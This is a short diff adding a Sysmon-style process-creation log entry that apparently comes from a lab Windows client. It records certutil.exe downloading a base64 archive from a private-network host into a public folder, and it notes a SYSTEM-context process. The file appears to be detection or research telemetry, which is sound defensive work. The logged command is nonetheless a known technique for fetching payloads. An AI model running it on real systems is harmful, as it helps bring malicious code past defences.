@@ -1,0 +1,11 @@
+EventID: 1
+Image: C:\Windows\System32\certutil.exe
+CommandLine:
+"C:\Windows\system32\certutil.exe" -urlcache -split -f http://192.168.1.13:8000/archive.b64 C:\Users\Public\out.b64
+
+IntegrityLevel: High
+User: LAB-WIN-CLIENT\vagrant
+ParentProcessId: 7272
+
+Additional:
+MoUsoCoreWorker.exe SYSTEM context observed
